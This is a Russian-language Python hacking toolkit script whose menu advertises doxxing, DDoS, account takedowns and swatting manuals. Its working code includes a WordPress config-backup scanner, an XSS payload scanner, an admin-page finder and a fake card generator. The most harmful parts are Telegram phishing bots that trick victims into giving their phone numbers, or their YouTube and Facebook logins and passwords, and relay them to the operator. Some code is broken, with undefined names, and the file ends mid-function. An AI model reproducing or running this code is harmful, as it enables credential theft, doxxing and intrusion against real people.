import asyncio
import threading
import random
from pystyle import Colors, Box, Write, Center, Colorate
import time
import ctypes
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import whois
import os
import telebot, time
from telebot import *
import time
import traceback
import string
import random
from faker import Faker
import csv
import telebot
from telebot import types
import time
import asyncio
import socket
from telethon.sync import TelegramClient
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import TelegramClient, events
from telethon.sync import TelegramClient
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
import urllib, socket
from urllib.parse import urlparse
from urllib.request import urlopen
import pystyle



def generate_password(length, complexity):
    characters = get_characters(complexity)
    password = ''.join(random.choice(characters) for i in range(length))
    
    return password
   
def generate_card_number(country):
    prefix = {"1": "9800", "2": "8100", "3": "3980"}
    return prefix[country] + ''.join(random.choice('0123456789') for _ in range(12))
global page
def wpbackupscanner(host):
    backups = ['/wp-config.php', '/wp-config.php.txt', '/wp-config.php.save', '/.wp-config.php.swp', '/wp-config.php.swp', '/wp-config.php.swo', '/wp-config.php_bak', '/wp-config.bak', '/wp-config.php.bak', '/wp-config.save', '/wp-config.old', '/wp-config.php.old', '/wp-config.php.orig', '/wp-config.orig', '/wp-config.php.original', '/wp-config.original', '/wp-config.txt']
    print(Colorate.Horizontal(Colors.red_to_purple, ("Поиск WordPress backups")))
    progress = 0
    backup = []
    backupurl = []
    try:
        for i in backups:
            print(Colorate.Horizontal(Colors.red_to_purple, ("Прогресс %i / %s"% (progress, len(backups)))))
            progress += 1
            sock(host, i)
            if page.getcode() == 200:
                detecting = str(sock(host, i, "1"))
                if "define('BD_PASSWORD')" in detecting:
                    s1 = i
                    s2 = data
                    backup.append(s1)
                    backupurl.append(s2)
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_purple, ("Детект файлов пропущен")))
    print('')
    for ifile,iurl in zip(backup, backupurl):
        print(Colorate.Horizontal(Colors.red_to_purple, ("Бэкап найден!\n | Название файла: %s\n | URL: %i\n"%(ifile,iurl))))
        
def dump_site(url):
    response = requests.get(url)
    if response.status_code != 200:
        exit(Colorate.Horizontal(Colors.red_to_purple, ("Не удалось получить доступ к сайту.")))
    soup = BeautifulSoup(response.text, "html.parser")
    filename = url.replace('https://', '').split('.')[0]+'.html'
    print(Colorate.Horizontal(Colors.red_to_purple, (f"Дамп сохранён в {filename}")))
    with open(filename, 'w', encoding='utf-8') as file:
    	file.write(soup.prettify())
     
def generation_naxyi():
    print(Colorate.Horizontal(Colors.red_to_purple, (f"Все ключи будут сохранены в файл mullvad_keys.txt")))
    keys = int(input(Colorate.Horizontal(Colors.red_to_purple, ("Сколько нужно сгенерировать ключей ---> "))))

    def generate_key():
        key = ''.join(random.choices(string.digits, k=16))
        return key

    def validated_key(key):
        if len(key) != 16:
            return False
        if not key.isdigit():
            return False
        return True

    def save_key(key):
        with open('mullvad_keys.txt', 'a') as file:
            file.write(key + '\n')

    for _ in range(keys):
        generated_key = generate_key()
        if validated_key(generated_key):
            save_key(generated_key)
        else:
            pass

def request_sd(url):
    try:
        return requests.get("https://"+url)
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.InvalidURL:
        pass
    except UnicodeError:
        pass
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_purple, ("Программа замороженна")))
        exit(0)

def generate_expiry_date():
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2023, 2030))
    return month + '/' + year[-2:]

def generate_cvv():
    return ''.join(random.choice('0123456789') for _ in range(3))

def generate_card(country):
    card_number = generate_card_number(country)
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return card_number, expiry_date, cvv

def subdomainfinger(wordlist, domain):
    wordlist = wordlist.split("\n")
    for line in wordlist:
        word = line.strip()
        test_url = word+"."+domain
        response = request_sd(test_url)
        if response.status_code == 200:
            print(f"[+] {test_url}")
        else:
            print(f"[-] {test_url}" )


def get_characters(complexity):
    characters = string.ascii_letters + string.digits
    if complexity == "medium":
        characters += "!@#$%^&*()" 
    elif complexity == "high":
        characters += string.punctuation
        
    return characters

def XSSScan(site):
    print(Colorate.Horizontal(Colors.red_to_purple, ("XSS сканер запущен")))
    vuln = []
    payloads = {
                        '3':'natrium();"\'\\/}{natrium',
                        '2':'natrium</script><script>alert(1)<script>natrium',
                        '1':'<natrium>'
    }
    path = "https://"+site+urllib.parse.urlparse(site).path
    parsedurl = urllib.parse.urlparse(site)
    parameters = urllib.parse.parse_qsl(parsedurl.query, keep_blank_values=True)
    parameternames = []
    parametervalues = []

    for m in parameters:
        parameternames.append(m[0])
        parametervalues.append(m[0])

    for n in parameters:
        found = 0
        try:
            for i in payloads:
                pay = payloads[i]
                index = parameternames.index(n[0])
                original = parametervalues[index]
                parametervalues[index] = pay
                modifiedurl = urllib.urlencode(dict(zip(parameternames, parametervalues)))
                parametervalues[index] = original
                modifiedparams = modifiedurl
                payloads = urllib.quote_plus(payloads[i])
                u = urllib.urlopen(path+"?"+modifiedparams)
                source = u.read()
                code = BeautifulSoup(source)
                if str(i) == str(1):
                    if payloads[i] in source:
                        found = 1
                script = code.findAll('script')
                if str(i) == str(3) or str(i) == str(2):
                    for p in range(len(script)):
                        try:
                            if pay in script[p].contents[0]:
                                found = 1
                        except IndexError:
                            pass
                if str(i) == str(2):
                    if payloads['2'] in source:
                        found = 1
        except KeyError:
            pass


def admin_finger(url):
    file = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist.txt").text
    file1 = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist1.txt").text
    file2 = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist2.txt").text
    file = file.split("\n")
    file1 = file1.split("\n")
    file2 = file2.split("\n")

    for line in file:
        admin_url1 = "https://" + url + "/" + line
        admin_url = admin_url1.replace('\n', '')
        response = requests.head(admin_url)
        if response.status_code == 200:
            print(f"[+] {admin_url}")
        else:
            print(f"[-] {admin_url}")
 
starting = '''
 
            ███▄ ▄███▓▓█████   █████▒▓█████ ▓█████▄  ██▀███   ▒█████   ███▄    █ 
           ▓██▒▀█▀ ██▒▓█   ▀ ▓██   ▒ ▓█   ▀ ▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ 
           ▓██    ▓██░▒███   ▒████ ░ ▒███   ░██   █▌▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
           ▒██    ▒██ ▒▓█  ▄ ░▓█▒  ░ ▒▓█  ▄ ░▓█▄   ▌▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
           ▒██▒   ░██▒░▒████▒░▒█░    ░▒████▒░▒████▓ ░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
            ░ ▒░   ░  ░░░ ▒░ ░ ▒ ░    ░░ ▒░ ░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
                ░  ░      ░ ░ ░  ░ ░       ░ ░  ░ ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
               ░      ░      ░    ░ ░       ░    ░ ░  ░   ░░   ░ ░ ░ ░ ▒     ░   ░ ░ 
              ░      ░  ░           ░  ░   ░       ░         ░ ░           ░ 
                                  ░                                   
'''
Write.Print(starting,Colors.red_to_white, interval=0.001)
                                      
menu = '''[666]- выйти                         By: ikea                              [777]- инфо
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
[1]- пробив по номеру                                 В платной версии
[2]- пробив по фио          │[10]- DDos(сайт)  │[13]- снос аккаунта
[3]- пробив по почте        │[11]- DDos(айпи)  │[14]- снос сессий
[4]- пробив по телеграму    │[12]- DDos(впн)   │[15]- снос канала
[5]- пробив по соц.сетям    │                  │[16]- снос бота
[6]- пробив по айпи         │                  │[17]- блок тега тг
[7]- пробив по никнейму     │                  │[18]- блок спам
[8]- пробив по вк           │                  │[19]- блок пароля
[9]- пробив по сайту        │                  │[20]- снос всего
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
[21]- генератор личности    │[25]- глаз бога   │[29]- мануал по доксу   │[33]- сват банворд
[22]- генератор карточки    │[26]- анонимн. чат│[30]- мануал по свату   │[34]- mullvad
[23]- генератор пароля      │[27]- накрутка    │[31]- мануал по сносу   │[35]- рассылка тг
[24]- генератор номера      │[28]- майлер      │[32]- мануал по термуксу │[36]- прокси лист
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''

Write.Print(Center.XCenter(Box.DoubleCube(menu)), Colors.red_to_white, interval=0.001)

               

               
def transform_text(input_text):
    translit_dict = {
        'а': '@',
        'б': 'Б',
        'в': 'B',
        'г': 'г',
        'д': 'д',
        'е': 'е',
        'ё': 'ё',
        'ж': 'ж',
        'з': '3',
        'и': 'u',
        'й': 'й',
        'к': 'K',
        'л': 'л',
        'м': 'M',
        'н': 'H',
        'о': '0',
        'п': 'п',
        'р': 'P',
        'с': 'c',
        'т': 'T',
        'у': 'y',
        'ф': 'ф',
        'х': 'X',
        'ц': 'ц',
        'ч': '4',
        'ш': 'ш',
        'щ': 'щ',
        'ъ': 'ъ',
        'ы': 'ы',
        'ь': 'ь',
        'э': 'э',
        'ю': 'ю',
        'я': 'я'
    }

    transformed_text = []
    
    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)
    
    return ''.join(transformed_text)
  
def ip_lookup(ip_address): 
  url = f"http://ip-api.com/json/{ip_address}"
  try:
    response = requests.get(url)
    data = response.json()
    if data.get("status") == "fail":
      return f"Ошибка: {data['message']}\n"
    
    info = ""
    for key, value in data.items():
      info += f"  |{key}: {value}\n"
    return info
  
  except Exception as e:
    return f"Произошла ошибка: {str(e)}\n"
def get_website_info(domain):

  try:
    domain_info = whois.whois(domain)
    print_string = f"""
  |Информация о сайте: 
  |Домен: {domain_info.domain_name}
  |Зарегистрирован: {domain_info.creation_date}
  |Истекает: {domain_info.expiration_date}  
  |Владелец: {domain_info.registrant_name}
  |Организация: {domain_info.registrant_organization}
  |Адрес: {domain_info.registrant_address}
  |Город: {domain_info.registrant_city}
  |Штат: {domain_info.registrant_state}
  |Почтовый индекс: {domain_info.registrant_postal_code}
  |Страна: {domain_info.registrant_country}
  |IP-адрес: {domain_info.name_servers}
    """
    Write.Print(print_string + "\n", Colors.red_to_purple, interval=0.005)
  except Exception as e:
    print(f"Ошибка: {e}\n")


while True:

  choice = Write.Input('\nВведите номер функции > ', Colors.red_to_white, interval=0.005)



  if choice == '29':
    api_id = 21782455 
    api_hash = '6a75750gnee5acb3asbbde2me3325l31'
    client = TelegramClient('anon', api_id, api_hash)

    async def main():
        await client.start()
            
        username = input("Введите юзер нейм: ")
        group = input("Введите ссылку группы: ")
            
        async for message in client.iter_messages(group, from_user=username):   
            date = str(message.date)
            name = message.from_id.user_id 
            content = str(message.text)
            row = [f"{date} | @{name}: {content}"] 
                
            with open('messages.csv', 'a', encoding='utf-8') as f:
                writer = csv.writer(f)  
                writer.writerow(row)
                    
        await client.disconnect()
  if choice == '7':
      nick = input(f"Введите никнейм: ")

      print(f"Поиск информации...")
      print(f"Соцсети")

      urls = [
          f"https://www.instagram.com/{nick}",
          f"https://www.tiktok.com/@{nick}",
          f"https://twitter.com/{nick}",
          f"https://www.facebook.com/{nick}",
          f"https://www.youtube.com/@{nick}",
          f"https://t.me/{nick}",
          f"https://www.roblox.com/user.aspx?username={nick}",
          f"https://https://www.twitch.tv/{nick}"

      ]

      for url in urls:
          try:
              response = requests.get(url)
              if response.status_code == 200:
                  print(f"{url} - аккаунт найден")
              elif response.status_code == 404:  
                  print(f"{url} - аккаунт не найден")
              else:
                  print(f"{url} - ошибка {response.status_code}")
          except:
              print(f"{url} - ошибка при проверке")
    
  if choice == '2':

    search_term = input("Введите фио: ")
    Search

  if choice == '666':
      print("выход...")
      time.sleep(0.5)  
      break        

  if choice == '13':
  
    snos_term = input("Введите @Username ")
    snos_term = input("Введите @id ")
    snos

  if choice == '777':
      print("""
Разработчик- @ikeapanic
Мой канал - @forever_termux
"""),
      time.sleep(0.5)

  if choice == '3':
      print("Технические проверки")
      time.sleep(0.5)  
        
  if choice == '4':
      print("Технические проверки")
      time.sleep(0.5)  

  if choice == '5':
      print("Введите ссылку")
      time.sleep(0.5)  

  if choice == '6':
      print("Технические проверки")
      time.sleep(0.5)  

  if choice == '25':
      
          Write.Print(("""
Мамонт кидает номер а вы его получаете.
    """), Colors.red_to_yellow, interval=0.001)
          
          Token = Write.Input('\nвведите токен: ', Colors.purple_to_red, interval=0.005)
          admin = Write.Input('введите свой айди: ', Colors.purple_to_red, interval=0.005)

          bot = telebot.TeleBot(Token)
          
          Write.Print(("бот запущен!"), Colors.red_to_purple, interval=0.005) 

          find_menu = types.InlineKeyboardMarkup()
          button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
          find_menu.row(button0)
          button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
          button2 = types.InlineKeyboardButton('🆘Поддержка',callback_data="dox")
          find_menu.row(button1,button2)
          button3 = types.InlineKeyboardButton('🤖Создать собственный бот',callback_data="dox")
          find_menu.row(button3)
          button4 = types.InlineKeyboardButton('🤝Партнерская программа',callback_data="dox")
          find_menu.row(button4)





          @bot.message_handler(commands=['start'])
          def start(message):
              bot.send_message(message.from_user.id,"*Добро пожаловать!*",parse_mode="Markdown")
              bot.send_message(message.from_user.id,"*Выберите нужное действие:*",parse_mode="Markdown",reply_markup=find_menu)


          @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
          def button0_pressed(call: types.CallbackQuery):
                bot.send_message(chat_id=call.message.chat.id,text= "👤 Поиск по имени\n"+\
                                                                                                "├  `Блогер` _(Поиск по тегу)_\n"\
                                                                                                "├  `Антипов Евгений Вячеславович`\n"\
                                                                                                "└  `Антипов Евгений Вячеславович 05.02.1994`\n"\
                                                                                                "_(Доступны также следующие форматы_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
                                                                                                "🚗 Поиск по авто\n"\
                                                                                                "├  `Н777ОН777` - поиск авто по *РФ*\n"\
                                                                                                "└  `ХТА21150053965897` - поиск по *VIN*\n\n"\
                                                                                                "👨 *Социальные сети*\n"\
                                                                                                "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
                                                                                                "├  `https://vk.com/id577744097` - *Вконтакте*\n"\
                                                                                                "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
                                                                                                "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"\
                                                                                                "📱 `79999939919` - для поиска по *номеру телефона*\n"\
                                                                                                "📨 `tema@gmail.com` - для поиска по *Email*\n"\
                                                                                            "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"\
                                                                                                "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"\
                                                                                                "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"\
                                                                                                "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"\
                                                                                                "🏛 `/company Сбербанк` - поиск по *юр лицам*\n"\
                                                                                                "📑 `/inn 784806113663` - поиск по *ИНН*\n"\
                                                                                                "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"\
                                                                                                "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"\
                                                                                                "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"\
                                                                                                "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"\
                                                                                                "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"\
                                                                                                "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",parse_mode="Markdown")

          send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
          button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
          send.add(button_phone)

          @bot.callback_query_handler(func=lambda call: call.data == "dox")
          def button1_pressed(call: types.CallbackQuery):
                bot.send_message(chat_id=call.message.chat.id,text= "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)



          @bot.message_handler(content_types=['contact']) 
          def contact(message):
              if message.contact is not None:
                  try:
                      Write.Print((f"\nКто-то отправил свой номер:\n Имя: {message.from_user.first_name}\n Логин: { message.from_user.username}\n ID: { message.from_user.id}\n Номер телефона:  { message.contact.phone_number}\n -------------------------------"), Colors.red_to_yellow, interval=0.005)
                      bot.send_message(admin,"*🔔Кто-то отправил свой номер!*\n"+\
                            "Имя: `"+message.from_user.first_name+\
                            "\n`Логин: @"+message.from_user.username+\
                              "\n`ID: "+str(message.from_user.id)+\
                            "\n`Номер телефона: `"+message.contact.phone_number+"`",parse_mode="Markdown")
                      f=open("db.csv","a+")
                      f.write(f"{message.from_user.first_name},{ message.from_user.last_name},{ message.from_user.username},{ message.from_user.id},{ message.contact.phone_number}\n")
                      f.close()
                  except TypeError:
                      traceback.print_exc()
                      print("Нет тела или др. typeerror")
                  curhour= time.asctime().split(" ")[3].split(":")[0]
                  bot.send_message(message.from_user.id,f"*⚠️ Технические работы до  {int(curhour) +7} :00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())



          @bot.message_handler(content_types=['text'])
          def handler(message):
                bot.send_message(message.from_user.id,"⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)




          bot.infinity_polling(none_stop=True)

  if choice == '26':

        token_bot = input("введите токен: ")
        bot = telebot.TeleBot(token_bot)
        bot.delete_webhook()

        waiting_users = []
        chatting_users = {}
        verified_users = {}

        def send_welcome(message):
            if message.chat.id in verified_users:
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее☺.")
                time.sleep(1)
                bot.send_message(message.chat.id, "Теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")
            else:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton(text='Подтвердить личность🐱‍👤', callback_data='verify'))
                bot.send_message(message.chat.id, f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее. Но для начала вам нужно подтвердить личность в связи с спамом🤒.", reply_markup=markup)

        @bot.message_handler(commands=['start'])
        def start_handler(message):
            send_welcome(message)

        @bot.callback_query_handler(func=lambda call: call.data == 'verify')
        def verify_handler(call):
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            button_contact = types.KeyboardButton(text="Отправить контакт", request_contact=True)
            markup.add(button_contact)
            bot.send_message(call.message.chat.id, "Пожалуйста, подтвердите свою личность, отправив свой контакт.", reply_markup=markup)

        @bot.message_handler(content_types=['text'])
        def text_handler(message):
            if message.chat.id not in verified_users:
                bot.send_message(message.chat.id, "❌Подтвердите личность чтобы использовать эту команду❌")
                return
            if message.text == '/search':
                waiting_users.append(message.chat.id)
                bot.send_message(message.chat.id, "Ожидание собеседника⏱")
                if len(waiting_users) > 1:
                    user1 = waiting_users.pop(0)
                    user2 = waiting_users.pop(0)
                    chatting_users[user1] = user2
                    chatting_users[user2] = user1
                    bot.send_message(user1, "Найден собеседник. Начните с ним диалог.")
                    bot.send_message(user2, "Найден собеседник. Начните с ним диалог.")
            elif message.text == '/stop':
                if message.chat.id in chatting_users:
                    partner_id = chatting_users[message.chat.id]
                    del chatting_users[message.chat.id]
                    del chatting_users[partner_id]
                    bot.send_message(partner_id, "Собеседник закончил с вами диалог😥")
                    send_welcome(message)
            else:
                if message.chat.id in chatting_users:
                    bot.send_message(chatting_users[message.chat.id], message.text)

        @bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.chat.id not in verified_users:
                verified_users[message.chat.id] = message.contact.phone_number
                with open('users.csv', 'a', newline='') as file:
                    writer = csv.writer(file)
                    writer.writerow([message.contact.phone_number, message.chat.id, message.from_user.username, message.from_user.first_name])
                bot.send_message(message.chat.id, "Отлично, теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop")

        @bot.message_handler(content_types=['document'])
        def document_handler(message):
            file_info = bot.get_file(message.document.file_id)
            if file_info.file_path.endswith('.exe') or file_info.file_path.endswith('.apk'):
                bot.delete_message(message.chat.id, message.message_id)
                bot.send_message(message.chat.id, "Извините, но отправка файлов .exe и .apk не разрешена.")

        bot.polling()

  if choice == '21':      
      fake = Faker(locale='ru_RU')  

      gender = input("Введите пол (М - мужской, Ж - женский): ")  

      if gender not in ['М', 'Ж']:
          gender = random.choice(['М', 'Ж'])
          print(f'Вы ввели неверное значение, будет выбрано случайным образом: {gender}')

      if gender == 'М': 
          first_name = fake.first_name_male() 
          middle_name = fake.middle_name_male()
      else:
          first_name = fake.first_name_female()
          middle_name = fake.middle_name_female()

      last_name = fake.last_name() 
      full_name = f'{last_name} {first_name} {middle_name}'

      birthdate = fake.date_of_birth()
      age = fake.random_int(min=18, max=80)

      street_address = fake.street_address()  
      city = fake.city()
      region = fake.region()
      postcode = fake.postcode() 
      address = f'{street_address}, {city}, {region} {postcode}'  

      email = fake.email()   
      phone_number = fake.phone_number()   

      inn = str(fake.random_number(digits=12, fix_len=True))
      snils = str(fake.random_number(digits=11, fix_len=True))  
      passport_num = str(fake.random_number(digits=10, fix_len=True))
      passport_series = fake.random_int(min=1000, max=9999)    

      print(f'ФИО: {full_name}')  
      print(f'Пол: {gender}')   
      print(f'Дата рождения: {birthdate.strftime("%d %B %Y")}')  
      print(f'Возраст: {age} лет') 
      print(f'Адрес: {address}')  
      print(f'Email: {email}')
      print(f'Телефон: {phone_number}')  
      print(f'ИНН: {inn}')   
      print(f'СНИЛС: {snils}')
      print(f'Паспорт серия: {passport_series} номер: {passport_num}')

  if choice == '23':
      password_length = int(Write.Input('Введите длину пароля: ', Colors.purple_to_red, interval=0.005))

      complexity = Write.Input('Выберите сложность (low, medium, high): ', Colors.purple_to_red, interval=0.005)

      complex_password = generate_password(password_length, complexity)
      Write.Print((complex_password + "\n"), Colors.red_to_purple, interval=0.005)


      if choice_fish == '27':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenccc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего YouTube аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: YouTube
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: YouTube 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()


      if choice_fish == '4':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenccc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего FaceBook аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: FaceBook
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: tiktok 
